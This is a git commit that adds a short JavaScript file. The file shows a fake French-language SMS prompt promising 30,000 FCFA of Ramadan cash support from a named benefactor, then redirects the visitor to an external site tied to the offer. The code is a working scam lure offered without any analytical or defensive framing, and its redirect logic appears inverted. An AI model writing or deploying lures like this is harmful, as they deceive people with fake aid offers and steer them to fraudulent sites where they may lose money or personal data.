e391ad586bcef0c2c8893dc2dca12290c084da67
usorondo48 <briefer_gilder1k@icloud.com>
2026-03-11 22:30:14 +0100

    Create senegalram.js

---
+++ senegalram.js
@@ -0,0 +1,9 @@
+var password = 'RETIRER DE L’ARGENT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour recevoir le SOUTIEN EN ESPÈCES DE RAMADAN DE 30 000 FCFA DE KABIROU MBODJE. Veuillez appuyer sur OK pour recevoir immédiatement.',
+  'RETIRER DE L’ARGENT'
+);
+if (password != 'RETIRER DE L’ARGENT') {
+  location.href = 'https://www.essienboi.site/30000fcfa-soutien-au-ramadan';
+  }
+ 
